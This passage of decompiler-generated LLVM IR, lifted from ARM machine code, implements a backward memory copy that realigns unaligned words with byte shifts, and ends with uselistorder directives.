bb146:                                            ; preds = %bb145
  %v8_151c8 = load i32, i32* @r1, align 4
  %v9_151c8 = add i32 %v8_151c8, -1
  %v10_151c8 = inttoptr i32 %v9_151c8 to i8*
  %v11_151c8 = load i8, i8* %v10_151c8, align 1
  %v12_151c8 = zext i8 %v11_151c8 to i32
  store i32 %v12_151c8, i32* %r3.global-to-local, align 4
  store i32 %v9_151c8, i32* @r1, align 4
  %v11_151cc = add i32 %v11_151c4, -2
  %v12_151cc = inttoptr i32 %v11_151cc to i8*
  store i8 %v11_151c8, i8* %v12_151cc, align 1
  %v13_151cc = load i32, i32* %r0.global-to-local, align 4
  %v14_151cc = add i32 %v13_151cc, -1
  store i32 %v14_151cc, i32* %r0.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb145, %dec_label_pc_151b4, %bb146
  %v0_1522831 = phi i32 [ %v12_151c4, %bb145 ], [ %v6_151bc, %dec_label_pc_151b4 ], [ %v14_151cc, %bb146 ]
  %v0_151d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_151d0 = load i32, i32* @ip, align 4
  %v2_151d0 = sub i32 %v0_151d0, %v1_151d0
  store i32 %v2_151d0, i32* %r2.global-to-local, align 4
  %v4_151d0 = xor i32 %v1_151d0, %v0_151d0
  %v5_151d0 = xor i32 %v2_151d0, %v0_151d0
  %v6_151d0 = and i32 %v5_151d0, %v4_151d0
  %v7_151d0 = icmp slt i32 %v6_151d0, 0
  store i1 %v7_151d0, i1* %cpsr_v.global-to-local, align 1
  %v8_151d0 = icmp slt i32 %v2_151d0, 0
  store i1 %v8_151d0, i1* %cpsr_n.global-to-local, align 1
  %v5_151d4 = icmp slt i32 %v0_151d0, %v1_151d0
  br i1 %v5_151d4, label %bb141, label %dec_label_pc_151d8

dec_label_pc_151d8:                               ; preds = %.thread25
  %v0_151d8 = load i32, i32* @r1, align 4
  %v1_151d8 = urem i32 %v0_151d8, 4
  store i32 %v1_151d8, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_151d8 = icmp eq i32 %v1_151d8, 0
  br i1 %v2_151d8, label %dec_label_pc_1511c, label %dec_label_pc_151e0

dec_label_pc_151e0:                               ; preds = %dec_label_pc_15114, %dec_label_pc_151d8
  %v0_1522830 = phi i32 [ %v2_15100, %dec_label_pc_15114 ], [ %v0_1522831, %dec_label_pc_151d8 ]
  %v0_152d4 = phi i32 [ %v2_15104, %dec_label_pc_15114 ], [ %v2_151d0, %dec_label_pc_151d8 ]
  %v0_151e0 = phi i32 [ %v2_150fc, %dec_label_pc_15114 ], [ %v0_151d8, %dec_label_pc_151d8 ]
  %v0_151e8 = phi i32 [ %v1_15114, %dec_label_pc_15114 ], [ %v1_151d8, %dec_label_pc_151d8 ]
  %v1_151e0 = and i32 %v0_151e0, -4
  store i32 %v1_151e0, i32* %r1.global-to-local, align 4
  %v1_151e4 = inttoptr i32 %v1_151e0 to i32*
  %v2_151e4 = load i32, i32* %v1_151e4, align 4
  store i32 %v2_151e4, i32* %r3.global-to-local, align 4
  %v7_151e8 = icmp ult i32 %v0_151e8, 2
  %v2_152cc = add i32 %v0_152d4, -12
  %v4_152cc = sub i32 11, %v0_152d4
  %v5_152cc = and i32 %v4_152cc, %v0_152d4
  %v6_152cc = icmp slt i32 %v5_152cc, 0
  store i1 %v6_152cc, i1* %cpsr_v.global-to-local, align 1
  %v7_152cc = icmp slt i32 %v2_152cc, 0
  store i1 %v7_152cc, i1* %cpsr_n.global-to-local, align 1
  %v5_152d0 = icmp slt i32 %v0_152d4, 12
  br i1 %v7_151e8, label %dec_label_pc_152cc, label %dec_label_pc_151f0

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151e0
  %v8_151e8 = icmp eq i32 %v0_151e8, 2
  br i1 %v8_151e8, label %dec_label_pc_15260, label %dec_label_pc_151f4

dec_label_pc_151f4:                               ; preds = %dec_label_pc_151f0
  br i1 %v5_152d0, label %dec_label_pc_15240, label %dec_label_pc_151fc

dec_label_pc_151fc:                               ; preds = %dec_label_pc_151f4
  store i32 %v2_152cc, i32* %r2.global-to-local, align 4
  %v3_15200 = load i32, i32* @r4, align 4
  store i32 %v3_15200, i32* %stack_var_-12, align 4
  %v6_15200 = load i32, i32* @r5, align 4
  store i32 %v6_15200, i32* %stack_var_-8, align 4
  %v9_15200 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15204

dec_label_pc_15204:                               ; preds = %dec_label_pc_15204.dec_label_pc_15204_crit_edge, %dec_label_pc_151fc
  %v0_15228 = phi i32 [ %v1_15228, %dec_label_pc_15204.dec_label_pc_15204_crit_edge ], [ %v0_1522830, %dec_label_pc_151fc ]
  %v0_15208 = phi i32 [ %v0_15208.pre, %dec_label_pc_15204.dec_label_pc_15204_crit_edge ], [ %v1_151e0, %dec_label_pc_151fc ]
  %v0_15204 = phi i32 [ %v0_15204.pre, %dec_label_pc_15204.dec_label_pc_15204_crit_edge ], [ %v2_151e4, %dec_label_pc_151fc ]
  %v3_15204 = mul i32 %v0_15204, 256
  store i32 %v3_15204, i32* %lr.global-to-local, align 4
  %v1_15208 = add i32 %v0_15208, -4
  %v2_15208 = inttoptr i32 %v1_15208 to i32*
  %v3_15208 = load i32, i32* %v2_15208, align 4
  store i32 %v3_15208, i32* %r3.global-to-local, align 4
  %v4_15208 = add i32 %v0_15208, -8
  %v5_15208 = inttoptr i32 %v4_15208 to i32*
  %v6_15208 = load i32, i32* %v5_15208, align 4
  store i32 %v6_15208, i32* %r4.global-to-local, align 4
  %v7_15208 = add i32 %v0_15208, -12
  %v8_15208 = inttoptr i32 %v7_15208 to i32*
  %v9_15208 = load i32, i32* %v8_15208, align 4
  store i32 %v9_15208, i32* %r5.global-to-local, align 4
  %v10_15208 = add i32 %v0_15208, -16
  %v11_15208 = inttoptr i32 %v10_15208 to i32*
  %v12_15208 = load i32, i32* %v11_15208, align 4
  store i32 %v10_15208, i32* %r1.global-to-local, align 4
  %v4_1520c = udiv i32 %v12_15208, 16777216
  %v5_1520c = or i32 %v4_1520c, %v3_15204
  store i32 %v5_1520c, i32* %lr.global-to-local, align 4
  %v3_15210 = mul i32 %v12_15208, 256
  %v4_15214 = udiv i32 %v9_15208, 16777216
  %v5_15214 = or i32 %v3_15210, %v4_15214
  store i32 %v5_15214, i32* @ip, align 4
  %v3_15218 = mul i32 %v9_15208, 256
  %v4_1521c = udiv i32 %v6_15208, 16777216
  %v5_1521c = or i32 %v3_15218, %v4_1521c
  store i32 %v5_1521c, i32* %r5.global-to-local, align 4
  %v3_15220 = mul i32 %v6_15208, 256
  %v4_15224 = udiv i32 %v3_15208, 16777216
  %v5_15224 = or i32 %v3_15220, %v4_15224
  store i32 %v5_15224, i32* %r4.global-to-local, align 4
  %v1_15228 = add i32 %v0_15228, -16
  %v2_15228 = inttoptr i32 %v1_15228 to i32*
  store i32 %v5_15224, i32* %v2_15228, align 4
  %v4_15228 = add i32 %v0_15228, -12
  %v5_15228 = inttoptr i32 %v4_15228 to i32*
  %v6_15228 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15228, i32* %v5_15228, align 4
  %v7_15228 = add i32 %v0_15228, -8
  %v8_15228 = inttoptr i32 %v7_15228 to i32*
  %v9_15228 = load i32, i32* @ip, align 4
  store i32 %v9_15228, i32* %v8_15228, align 4
  %v10_15228 = add i32 %v0_15228, -4
  %v11_15228 = inttoptr i32 %v10_15228 to i32*
  %v12_15228 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15228, i32* %v11_15228, align 4
  store i32 %v1_15228, i32* %r0.global-to-local, align 4
  %v0_1522c = load i32, i32* %r2.global-to-local, align 4
  %v2_1522c = add i32 %v0_1522c, -16
  store i32 %v2_1522c, i32* %r2.global-to-local, align 4
  %v6_15230 = icmp slt i32 %v0_1522c, 16
  br i1 %v6_15230, label %dec_label_pc_15234, label %dec_label_pc_15204.dec_label_pc_15204_crit_edge

dec_label_pc_15204.dec_label_pc_15204_crit_edge:  ; preds = %dec_label_pc_15204
  %v0_15204.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15208.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15204

dec_label_pc_15234:                               ; preds = %dec_label_pc_15204
  %v2_15234 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15234, i32* @r4, align 4
  %v5_15234 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_15234, i32* @r5, align 4
  store i32 %v9_15200, i32* @lr, align 4
  %v2_15238 = add i32 %v0_1522c, -4
  store i32 %v2_15238, i32* %r2.global-to-local, align 4
  %v4_15238 = add i32 %v0_1522c, 2147483632
  %v5_15238 = and i32 %v2_15238, %v4_15238
  %v6_15238 = icmp slt i32 %v5_15238, 0
  store i1 %v6_15238, i1* %cpsr_v.global-to-local, align 1
  %v7_15238 = icmp slt i32 %v2_15238, 0
  store i1 %v7_15238, i1* %cpsr_n.global-to-local, align 1
  %v5_1523c = icmp slt i32 %v2_1522c, -12
  br i1 %v5_1523c, label %dec_label_pc_15258, label %dec_label_pc_15240

dec_label_pc_15240:                               ; preds = %dec_label_pc_15234, %dec_label_pc_151f4, %dec_label_pc_15240
  %v1_1524c = phi i32 [ %v5_1524c, %dec_label_pc_15240 ], [ %v1_15228, %dec_label_pc_15234 ], [ %v0_1522830, %dec_label_pc_151f4 ]
  %v0_15240 = load i32, i32* %r3.global-to-local, align 4
  %v3_15240 = mul i32 %v0_15240, 256
  store i32 %v3_15240, i32* %ip.global-to-local, align 4
  %v0_15244 = load i32, i32* %r1.global-to-local, align 4
  %v1_15244 = add i32 %v0_15244, -4
  %v2_15244 = inttoptr i32 %v1_15244 to i32*
  %v3_15244 = load i32, i32* %v2_15244, align 4
  store i32 %v3_15244, i32* %r3.global-to-local, align 4
  store i32 %v1_15244, i32* %r1.global-to-local, align 4
  %v4_15248 = udiv i32 %v3_15244, 16777216
  %v5_15248 = or i32 %v4_15248, %v3_15240
  store i32 %v5_15248, i32* @ip, align 4
  %v2_1524c = add i32 %v1_1524c, -4
  %v3_1524c = inttoptr i32 %v2_1524c to i32*
  store i32 %v5_15248, i32* %v3_1524c, align 4
  %v4_1524c = load i32, i32* %r0.global-to-local, align 4
  %v5_1524c = add i32 %v4_1524c, -4
  store i32 %v5_1524c, i32* %r0.global-to-local, align 4
  %v0_15250 = load i32, i32* %r2.global-to-local, align 4
  %v2_15250 = add i32 %v0_15250, -4
  store i32 %v2_15250, i32* %r2.global-to-local, align 4
  %v6_15254 = icmp slt i32 %v0_15250, 4
  br i1 %v6_15254, label %dec_label_pc_15258.loopexit, label %dec_label_pc_15240

dec_label_pc_15258.loopexit:                      ; preds = %dec_label_pc_15240
  %v4_15250 = sub i32 3, %v0_15250
  %v5_15250 = and i32 %v4_15250, %v0_15250
  %v6_15250 = icmp slt i32 %v5_15250, 0
  %v7_15250 = icmp slt i32 %v2_15250, 0
  store i1 %v6_15250, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15250, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15258

dec_label_pc_15258:                               ; preds = %dec_label_pc_15258.loopexit, %dec_label_pc_15234
  %v2_1519c62 = phi i32 [ %v5_1524c, %dec_label_pc_15258.loopexit ], [ %v1_15228, %dec_label_pc_15234 ]
  %v0_1518c58 = phi i32 [ %v2_15250, %dec_label_pc_15258.loopexit ], [ %v2_15238, %dec_label_pc_15234 ]
  %v0_15258 = load i32, i32* %r1.global-to-local, align 4
  %v1_15258 = add i32 %v0_15258, 3
  store i32 %v1_15258, i32* @r1, align 4
  br label %bb141

dec_label_pc_15260:                               ; preds = %dec_label_pc_151f0
  br i1 %v5_152d0, label %dec_label_pc_152ac, label %dec_label_pc_15268

dec_label_pc_15268:                               ; preds = %dec_label_pc_15260
  store i32 %v2_152cc, i32* %r2.global-to-local, align 4
  %v3_1526c = load i32, i32* @r4, align 4
  store i32 %v3_1526c, i32* %stack_var_-12, align 4
  %v6_1526c = load i32, i32* @r5, align 4
  store i32 %v6_1526c, i32* %stack_var_-8, align 4
  %v9_1526c = load i32, i32* @lr, align 4
  br label %dec_label_pc_15270

dec_label_pc_15270:                               ; preds = %dec_label_pc_15270.dec_label_pc_15270_crit_edge, %dec_label_pc_15268
  %v0_15294 = phi i32 [ %v1_15294, %dec_label_pc_15270.dec_label_pc_15270_crit_edge ], [ %v0_1522830, %dec_label_pc_15268 ]
  %v0_15274 = phi i32 [ %v0_15274.pre, %dec_label_pc_15270.dec_label_pc_15270_crit_edge ], [ %v1_151e0, %dec_label_pc_15268 ]
  %v0_15270 = phi i32 [ %v0_15270.pre, %dec_label_pc_15270.dec_label_pc_15270_crit_edge ], [ %v2_151e4, %dec_label_pc_15268 ]
  %v3_15270 = mul i32 %v0_15270, 65536
  store i32 %v3_15270, i32* %lr.global-to-local, align 4
  %v1_15274 = add i32 %v0_15274, -4
  %v2_15274 = inttoptr i32 %v1_15274 to i32*
  %v3_15274 = load i32, i32* %v2_15274, align 4
  store i32 %v3_15274, i32* %r3.global-to-local, align 4
  %v4_15274 = add i32 %v0_15274, -8
  %v5_15274 = inttoptr i32 %v4_15274 to i32*
  %v6_15274 = load i32, i32* %v5_15274, align 4
  store i32 %v6_15274, i32* %r4.global-to-local, align 4
  %v7_15274 = add i32 %v0_15274, -12
  %v8_15274 = inttoptr i32 %v7_15274 to i32*
  %v9_15274 = load i32, i32* %v8_15274, align 4
  store i32 %v9_15274, i32* %r5.global-to-local, align 4
  %v10_15274 = add i32 %v0_15274, -16
  %v11_15274 = inttoptr i32 %v10_15274 to i32*
  %v12_15274 = load i32, i32* %v11_15274, align 4
  store i32 %v10_15274, i32* %r1.global-to-local, align 4
  %v4_15278 = udiv i32 %v12_15274, 65536
  %v5_15278 = or i32 %v4_15278, %v3_15270
  store i32 %v5_15278, i32* %lr.global-to-local, align 4
  %v3_1527c = mul i32 %v12_15274, 65536
  %v4_15280 = udiv i32 %v9_15274, 65536
  %v5_15280 = or i32 %v3_1527c, %v4_15280
  store i32 %v5_15280, i32* @ip, align 4
  %v3_15284 = mul i32 %v9_15274, 65536
  %v4_15288 = udiv i32 %v6_15274, 65536
  %v5_15288 = or i32 %v3_15284, %v4_15288
  store i32 %v5_15288, i32* %r5.global-to-local, align 4
  %v3_1528c = mul i32 %v6_15274, 65536
  %v4_15290 = udiv i32 %v3_15274, 65536
  %v5_15290 = or i32 %v3_1528c, %v4_15290
  store i32 %v5_15290, i32* %r4.global-to-local, align 4
  %v1_15294 = add i32 %v0_15294, -16
  %v2_15294 = inttoptr i32 %v1_15294 to i32*
  store i32 %v5_15290, i32* %v2_15294, align 4
  %v4_15294 = add i32 %v0_15294, -12
  %v5_15294 = inttoptr i32 %v4_15294 to i32*
  %v6_15294 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15294, i32* %v5_15294, align 4
  %v7_15294 = add i32 %v0_15294, -8
  %v8_15294 = inttoptr i32 %v7_15294 to i32*
  %v9_15294 = load i32, i32* @ip, align 4
  store i32 %v9_15294, i32* %v8_15294, align 4
  %v10_15294 = add i32 %v0_15294, -4
  %v11_15294 = inttoptr i32 %v10_15294 to i32*
  %v12_15294 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15294, i32* %v11_15294, align 4
  store i32 %v1_15294, i32* %r0.global-to-local, align 4
  %v0_15298 = load i32, i32* %r2.global-to-local, align 4
  %v2_15298 = add i32 %v0_15298, -16
  store i32 %v2_15298, i32* %r2.global-to-local, align 4
  %v6_1529c = icmp slt i32 %v0_15298, 16
  br i1 %v6_1529c, label %dec_label_pc_152a0, label %dec_label_pc_15270.dec_label_pc_15270_crit_edge

dec_label_pc_15270.dec_label_pc_15270_crit_edge:  ; preds = %dec_label_pc_15270
  %v0_15270.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15274.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15270

dec_label_pc_152a0:                               ; preds = %dec_label_pc_15270
  %v2_152a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_152a0, i32* @r4, align 4
  %v5_152a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_152a0, i32* @r5, align 4
  store i32 %v9_1526c, i32* @lr, align 4
  %v2_152a4 = add i32 %v0_15298, -4
  store i32 %v2_152a4, i32* %r2.global-to-local, align 4
  %v4_152a4 = add i32 %v0_15298, 2147483632
  %v5_152a4 = and i32 %v2_152a4, %v4_152a4
  %v6_152a4 = icmp slt i32 %v5_152a4, 0
  store i1 %v6_152a4, i1* %cpsr_v.global-to-local, align 1
  %v7_152a4 = icmp slt i32 %v2_152a4, 0
  store i1 %v7_152a4, i1* %cpsr_n.global-to-local, align 1
  %v5_152a8 = icmp slt i32 %v2_15298, -12
  br i1 %v5_152a8, label %dec_label_pc_152c4, label %dec_label_pc_152ac

dec_label_pc_152ac:                               ; preds = %dec_label_pc_152a0, %dec_label_pc_15260, %dec_label_pc_152ac
  %v1_152b8 = phi i32 [ %v5_152b8, %dec_label_pc_152ac ], [ %v1_15294, %dec_label_pc_152a0 ], [ %v0_1522830, %dec_label_pc_15260 ]
  %v0_152ac = load i32, i32* %r3.global-to-local, align 4
  %v3_152ac = mul i32 %v0_152ac, 65536
  store i32 %v3_152ac, i32* %ip.global-to-local, align 4
  %v0_152b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_152b0 = add i32 %v0_152b0, -4
  %v2_152b0 = inttoptr i32 %v1_152b0 to i32*
  %v3_152b0 = load i32, i32* %v2_152b0, align 4
  store i32 %v3_152b0, i32* %r3.global-to-local, align 4
  store i32 %v1_152b0, i32* %r1.global-to-local, align 4
  %v4_152b4 = udiv i32 %v3_152b0, 65536
  %v5_152b4 = or i32 %v4_152b4, %v3_152ac
  store i32 %v5_152b4, i32* @ip, align 4
  %v2_152b8 = add i32 %v1_152b8, -4
  %v3_152b8 = inttoptr i32 %v2_152b8 to i32*
  store i32 %v5_152b4, i32* %v3_152b8, align 4
  %v4_152b8 = load i32, i32* %r0.global-to-local, align 4
  %v5_152b8 = add i32 %v4_152b8, -4
  store i32 %v5_152b8, i32* %r0.global-to-local, align 4
  %v0_152bc = load i32, i32* %r2.global-to-local, align 4
  %v2_152bc = add i32 %v0_152bc, -4
  store i32 %v2_152bc, i32* %r2.global-to-local, align 4
  %v6_152c0 = icmp slt i32 %v0_152bc, 4
  br i1 %v6_152c0, label %dec_label_pc_152c4.loopexit, label %dec_label_pc_152ac

dec_label_pc_152c4.loopexit:                      ; preds = %dec_label_pc_152ac
  %v4_152bc = sub i32 3, %v0_152bc
  %v5_152bc = and i32 %v4_152bc, %v0_152bc
  %v6_152bc = icmp slt i32 %v5_152bc, 0
  %v7_152bc = icmp slt i32 %v2_152bc, 0
  store i1 %v6_152bc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_152bc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_152c4

dec_label_pc_152c4:                               ; preds = %dec_label_pc_152c4.loopexit, %dec_label_pc_152a0
  %v2_1519c63 = phi i32 [ %v5_152b8, %dec_label_pc_152c4.loopexit ], [ %v1_15294, %dec_label_pc_152a0 ]
  %v0_1518c59 = phi i32 [ %v2_152bc, %dec_label_pc_152c4.loopexit ], [ %v2_152a4, %dec_label_pc_152a0 ]
  %v0_152c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_152c4 = add i32 %v0_152c4, 2
  store i32 %v1_152c4, i32* @r1, align 4
  br label %bb141

dec_label_pc_152cc:                               ; preds = %dec_label_pc_151e0
  br i1 %v5_152d0, label %dec_label_pc_15318, label %dec_label_pc_152d4

dec_label_pc_152d4:                               ; preds = %dec_label_pc_152cc
  store i32 %v2_152cc, i32* %r2.global-to-local, align 4
  %v3_152d8 = load i32, i32* @r4, align 4
  store i32 %v3_152d8, i32* %stack_var_-12, align 4
  %v6_152d8 = load i32, i32* @r5, align 4
  store i32 %v6_152d8, i32* %stack_var_-8, align 4
  %v9_152d8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_152dc

dec_label_pc_152dc:                               ; preds = %dec_label_pc_152dc.dec_label_pc_152dc_crit_edge, %dec_label_pc_152d4
  %v0_15300 = phi i32 [ %v1_15300, %dec_label_pc_152dc.dec_label_pc_152dc_crit_edge ], [ %v0_1522830, %dec_label_pc_152d4 ]
  %v0_152e0 = phi i32 [ %v0_152e0.pre, %dec_label_pc_152dc.dec_label_pc_152dc_crit_edge ], [ %v1_151e0, %dec_label_pc_152d4 ]
  %v0_152dc = phi i32 [ %v0_152dc.pre, %dec_label_pc_152dc.dec_label_pc_152dc_crit_edge ], [ %v2_151e4, %dec_label_pc_152d4 ]
  %v3_152dc = mul i32 %v0_152dc, 16777216
  store i32 %v3_152dc, i32* %lr.global-to-local, align 4
  %v1_152e0 = add i32 %v0_152e0, -4
  %v2_152e0 = inttoptr i32 %v1_152e0 to i32*
  %v3_152e0 = load i32, i32* %v2_152e0, align 4
  store i32 %v3_152e0, i32* %r3.global-to-local, align 4
  %v4_152e0 = add i32 %v0_152e0, -8
  %v5_152e0 = inttoptr i32 %v4_152e0 to i32*
  %v6_152e0 = load i32, i32* %v5_152e0, align 4
  store i32 %v6_152e0, i32* %r4.global-to-local, align 4
  %v7_152e0 = add i32 %v0_152e0, -12
  %v8_152e0 = inttoptr i32 %v7_152e0 to i32*
  %v9_152e0 = load i32, i32* %v8_152e0, align 4
  store i32 %v9_152e0, i32* %r5.global-to-local, align 4
  %v10_152e0 = add i32 %v0_152e0, -16
  %v11_152e0 = inttoptr i32 %v10_152e0 to i32*
  %v12_152e0 = load i32, i32* %v11_152e0, align 4
  store i32 %v10_152e0, i32* %r1.global-to-local, align 4
  %v4_152e4 = udiv i32 %v12_152e0, 256
  %v5_152e4 = or i32 %v4_152e4, %v3_152dc
  store i32 %v5_152e4, i32* %lr.global-to-local, align 4
  %v3_152e8 = mul i32 %v12_152e0, 16777216
  %v4_152ec = udiv i32 %v9_152e0, 256
  %v5_152ec = or i32 %v3_152e8, %v4_152ec
  store i32 %v5_152ec, i32* @ip, align 4
  %v3_152f0 = mul i32 %v9_152e0, 16777216
  %v4_152f4 = udiv i32 %v6_152e0, 256
  %v5_152f4 = or i32 %v3_152f0, %v4_152f4
  store i32 %v5_152f4, i32* %r5.global-to-local, align 4
  %v3_152f8 = mul i32 %v6_152e0, 16777216
  %v4_152fc = udiv i32 %v3_152e0, 256
  %v5_152fc = or i32 %v3_152f8, %v4_152fc
  store i32 %v5_152fc, i32* %r4.global-to-local, align 4
  %v1_15300 = add i32 %v0_15300, -16
  %v2_15300 = inttoptr i32 %v1_15300 to i32*
  store i32 %v5_152fc, i32* %v2_15300, align 4
  %v4_15300 = add i32 %v0_15300, -12
  %v5_15300 = inttoptr i32 %v4_15300 to i32*
  %v6_15300 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15300, i32* %v5_15300, align 4
  %v7_15300 = add i32 %v0_15300, -8
  %v8_15300 = inttoptr i32 %v7_15300 to i32*
  %v9_15300 = load i32, i32* @ip, align 4
  store i32 %v9_15300, i32* %v8_15300, align 4
  %v10_15300 = add i32 %v0_15300, -4
  %v11_15300 = inttoptr i32 %v10_15300 to i32*
  %v12_15300 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15300, i32* %v11_15300, align 4
  store i32 %v1_15300, i32* %r0.global-to-local, align 4
  %v0_15304 = load i32, i32* %r2.global-to-local, align 4
  %v2_15304 = add i32 %v0_15304, -16
  store i32 %v2_15304, i32* %r2.global-to-local, align 4
  %v6_15308 = icmp slt i32 %v0_15304, 16
  br i1 %v6_15308, label %dec_label_pc_1530c, label %dec_label_pc_152dc.dec_label_pc_152dc_crit_edge

dec_label_pc_152dc.dec_label_pc_152dc_crit_edge:  ; preds = %dec_label_pc_152dc
  %v0_152dc.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_152e0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_152dc

dec_label_pc_1530c:                               ; preds = %dec_label_pc_152dc
  %v2_1530c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1530c, i32* @r4, align 4
  %v5_1530c = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_1530c, i32* @r5, align 4
  store i32 %v9_152d8, i32* @lr, align 4
  %v2_15310 = add i32 %v0_15304, -4
  store i32 %v2_15310, i32* %r2.global-to-local, align 4
  %v4_15310 = add i32 %v0_15304, 2147483632
  %v5_15310 = and i32 %v2_15310, %v4_15310
  %v6_15310 = icmp slt i32 %v5_15310, 0
  store i1 %v6_15310, i1* %cpsr_v.global-to-local, align 1
  %v7_15310 = icmp slt i32 %v2_15310, 0
  store i1 %v7_15310, i1* %cpsr_n.global-to-local, align 1
  %v5_15314 = icmp slt i32 %v2_15304, -12
  br i1 %v5_15314, label %dec_label_pc_15330, label %dec_label_pc_15318

dec_label_pc_15318:                               ; preds = %dec_label_pc_1530c, %dec_label_pc_152cc, %dec_label_pc_15318
  %v1_15324 = phi i32 [ %v5_15324, %dec_label_pc_15318 ], [ %v1_15300, %dec_label_pc_1530c ], [ %v0_1522830, %dec_label_pc_152cc ]
  %v0_15318 = load i32, i32* %r3.global-to-local, align 4
  %v3_15318 = mul i32 %v0_15318, 16777216
  store i32 %v3_15318, i32* %ip.global-to-local, align 4
  %v0_1531c = load i32, i32* %r1.global-to-local, align 4
  %v1_1531c = add i32 %v0_1531c, -4
  %v2_1531c = inttoptr i32 %v1_1531c to i32*
  %v3_1531c = load i32, i32* %v2_1531c, align 4
  store i32 %v3_1531c, i32* %r3.global-to-local, align 4
  store i32 %v1_1531c, i32* %r1.global-to-local, align 4
  %v4_15320 = udiv i32 %v3_1531c, 256
  %v5_15320 = or i32 %v4_15320, %v3_15318
  store i32 %v5_15320, i32* @ip, align 4
  %v2_15324 = add i32 %v1_15324, -4
  %v3_15324 = inttoptr i32 %v2_15324 to i32*
  store i32 %v5_15320, i32* %v3_15324, align 4
  %v4_15324 = load i32, i32* %r0.global-to-local, align 4
  %v5_15324 = add i32 %v4_15324, -4
  store i32 %v5_15324, i32* %r0.global-to-local, align 4
  %v0_15328 = load i32, i32* %r2.global-to-local, align 4
  %v2_15328 = add i32 %v0_15328, -4
  store i32 %v2_15328, i32* %r2.global-to-local, align 4
  %v6_1532c = icmp slt i32 %v0_15328, 4
  br i1 %v6_1532c, label %dec_label_pc_15330.loopexit, label %dec_label_pc_15318

dec_label_pc_15330.loopexit:                      ; preds = %dec_label_pc_15318
  %v4_15328 = sub i32 3, %v0_15328
  %v5_15328 = and i32 %v4_15328, %v0_15328
  %v6_15328 = icmp slt i32 %v5_15328, 0
  %v7_15328 = icmp slt i32 %v2_15328, 0
  store i1 %v6_15328, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15328, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15330

dec_label_pc_15330:                               ; preds = %dec_label_pc_15330.loopexit, %dec_label_pc_1530c
  %v2_1519c64 = phi i32 [ %v5_15324, %dec_label_pc_15330.loopexit ], [ %v1_15300, %dec_label_pc_1530c ]
  %v0_1518c60 = phi i32 [ %v2_15328, %dec_label_pc_15330.loopexit ], [ %v2_15310, %dec_label_pc_1530c ]
  %v0_15330 = load i32, i32* %r1.global-to-local, align 4
  %v1_15330 = add i32 %v0_15330, 1
  store i32 %v1_15330, i32* @r1, align 4
  br label %bb141

; uselistorder directives
  uselistorder i32 %v5_15324, { 0, 2, 1 }
  uselistorder i32 %v3_15318, { 1, 0 }
  uselistorder i32 %v2_15310, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15300, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_152e0, { 1, 0 }
  uselistorder i32 %v3_152dc, { 1, 0 }
  uselistorder i32 %v0_152e0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15300, { 3, 2, 1, 0 }
  uselistorder i32 %v5_152b8, { 0, 2, 1 }
  uselistorder i32 %v3_152ac, { 1, 0 }
  uselistorder i32 %v2_152a4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15294, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15274, { 1, 0 }
  uselistorder i32 %v3_15270, { 1, 0 }
  uselistorder i32 %v0_15274, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15294, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1524c, { 0, 2, 1 }
  uselistorder i32 %v3_15240, { 1, 0 }
  uselistorder i32 %v2_15238, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15228, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15208, { 1, 0 }
  uselistorder i32 %v3_15204, { 1, 0 }
  uselistorder i32 %v0_15208, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15228, { 3, 2, 1, 0 }
  uselistorder i1 %v5_152d0, { 2, 0, 1 }
  uselistorder i32 %v0_151e8, { 1, 0 }
  uselistorder i32 %v0_152d4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1522830, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_151d8, { 2, 1, 0 }
  uselistorder i32 %v0_151d8, { 2, 0, 1 }
  uselistorder i32 %v2_151d0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_151d0, { 1, 0, 2 }
  uselistorder i32 %v0_151d0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1522831, { 2, 1, 0 }
  uselistorder i32 %v11_151ac, { 1, 0 }
  uselistorder i32 %v7_151ac, { 1, 0 }
  uselistorder i32 %v1_1518c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1518c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15190, { 1, 0 }
  uselistorder i32 %v7_15184, { 0, 2, 1 }
